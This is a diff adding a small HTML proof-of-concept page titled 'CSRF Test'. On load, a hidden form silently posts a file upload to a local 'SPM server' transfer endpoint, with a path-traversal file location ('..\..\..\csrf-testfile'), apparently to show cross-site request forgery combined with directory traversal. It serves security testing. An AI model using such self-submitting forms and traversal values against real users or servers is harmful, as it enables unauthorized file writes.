@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+
+<html>
+
+  <head>
+
+    <title>CSRF Test</title>
+
+  </head>
+
+  <body>
+
+    <h1>CSRF Test</h1>
+	
+	<h2>Tried to upload file to the SPM server:</h2>
+	
+	<h2>SPM server response</h2>
+	
+	<iframe name="response_iframe"></iframe>
+	
+	
+	<form style="display: none" id="form" method="post" action="https://localhost:8091/cce/uibinding/transfer" enctype="multipart/form-data" target="response_iframe">
+	
+		<input type="hidden" name="serverFileLocation" value="..\..\..\csrf-testfile">
+		
+		<input type="hidden" name="fileInput" value="test">
+		
+		<input type="hidden" name="nodeAlias" value="local">
+		
+	</form>
+	
+	<script>
+	
+		document.getElementById("form").submit();
+	
+	</script>
+
+  </body>
+
+</html>
